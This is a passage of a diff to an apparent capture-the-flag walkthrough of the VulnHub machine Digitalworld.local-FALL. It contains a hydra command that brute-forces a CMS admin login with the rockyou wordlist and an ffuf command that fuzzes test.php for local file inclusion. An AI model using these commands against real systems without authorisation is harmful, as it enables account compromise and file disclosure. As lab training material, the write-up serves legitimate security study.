@@ -165,7 +165,7 @@ PORT     STATE SERVICE REASON         VERSION
 		- `patrick`
 2. Intercept `test.php` w/ burp
 	![](Pasted%20image%2020220208180001.png)
-	- javascript `alert('Missing GET parameter'`, is either a hint or a trick to make us fall down a rabbit hole.
+	- javascript `alert('Missing GET parameter')`
 3. Search exploits for `CMS Made Simple v2.2.15`
 	
 	| Exploit Title                                | Pat                   |
@@ -178,7 +178,7 @@ PORT     STATE SERVICE REASON         VERSION
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit]
 	└─# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" -V
 	```
-5. Fuzz for LFI vulnerability at `test.php?`
+5. Fuzz for LFI vulnerability at `test.php?<Get Parameter>=<LFI>`
 	```
 	┌──(root💀kali)-[/usr/share/wordlists]
 	└─# ffuf -u http://$ip/test.php?W1=W2 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2  -fw 3
